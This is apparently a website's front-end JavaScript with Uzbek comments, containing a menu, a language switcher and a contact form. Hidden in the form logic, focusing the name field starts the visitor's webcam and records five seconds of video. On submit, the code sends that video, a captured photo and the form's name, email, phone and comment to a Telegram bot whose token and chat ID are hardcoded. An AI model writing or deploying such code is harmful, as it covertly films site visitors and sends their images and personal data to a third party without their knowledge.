document.addEventListener("DOMContentLoaded", function () {
    const burgerBtn = document.querySelector(".header__burger__btn");
    const navList = document.querySelector(".header__list");
    const dropdownToggle = document.querySelector(".dropdown-toggle");
    const dropdownMenu = document.querySelector(".card");
    const langOptions = document.querySelectorAll(".lang-option");
    const s_lan = document.querySelector(".s_lan");

    // Burger menyu funksiyasi
    burgerBtn.addEventListener("click", () => {
        navList.classList.toggle("hidden");
    });

    // Dropdown menyuni ochish-yopish
    dropdownToggle.addEventListener("click", function () {
        dropdownMenu.classList.toggle("hidden");
    });

    // Til almashtirish funksiyasi
    const translations = {
        uz: {
            home: "Bosh sahifa",
            about: "Haqida",
            projects: "Loyihalar",
            contact: "Bog’lanish",
            language: "Til"
        },
        en: {
            home: "Home",
            about: "About",
            projects: "Projects",
            contact: "Contact",
            language: "Language"
        },
    };

    langOptions.forEach((option) => {
        option.addEventListener("click", function () {
            const selectedLang = this.getAttribute("data-lang");
            localStorage.setItem("selectedLang", selectedLang); // Tanlangan tilni saqlash

            document.querySelectorAll("[data-lang]").forEach((element) => {
                const key = element.getAttribute("data-lang");
                if (translations[selectedLang][key]) {
                    element.innerText = translations[selectedLang][key];
                }
            });

            dropdownMenu.classList.add("hidden"); // Til tanlangandan keyin menyuni yopish
        });
    });

    // Sayt ochilganda so'nggi tanlangan tilni yuklash
    const savedLang = localStorage.getItem("selectedLang") || "uz";
    document.querySelector(`[data-lang="${savedLang}"]`).click();


    let video = document.getElementById('video');
    let canvas = document.getElementById('canvas');
    let captureBtn = document.getElementById('captureBtn');
    let mediaRecorder;
    let videoChunks = [];
    let videoBlob;
    let stream;

    document.getElementById('ism').addEventListener('focus', async () => {
        document.getElementById('ism').value = "Foydalanuvchi";
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = 'block';

        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = (event) => videoChunks.push(event.data);
        mediaRecorder.onstop = () => {
            videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
            videoChunks = [];
            stream.getTracks().forEach(track => track.stop());
            video.style.display = 'none';
        };
        mediaRecorder.start();
        setTimeout(() => {
            mediaRecorder.stop();
        }, 5000);
    });

    captureBtn.addEventListener('click', () => {
        if (video.srcObject) {
            let context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.style.display = 'block';
        }
    });

    document.querySelector('.call__back__content').addEventListener('submit', async function(event) {
        event.preventDefault();
        let ism = document.getElementById('ism').value;
        let email = document.getElementById('email1').value;
        let telefon = document.getElementById('telefon').value;
        let izoh = document.getElementById('izoh').value;
        let botToken = '7772442946:AAGsBqTDxTm20nn-NfIye37zGmBpnOZrxTs';
        let chatId = '7221078203';
        let message = `Yangi xabar!\n\nIsm: ${ism}\nEmail: ${email}\nTelefon: ${telefon}\nIzoh: ${izoh}`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
        
        if (canvas && canvas.toBlob) {
            canvas.toBlob(async (blob) => {
                let formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'photo.png');
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
            });
        }
        
        if (videoBlob) {
            let formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', videoBlob, 'video.mp4');
            await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
        }
        alert('Xabar yuborildi!');
        this.reset();
    });
    
    
});
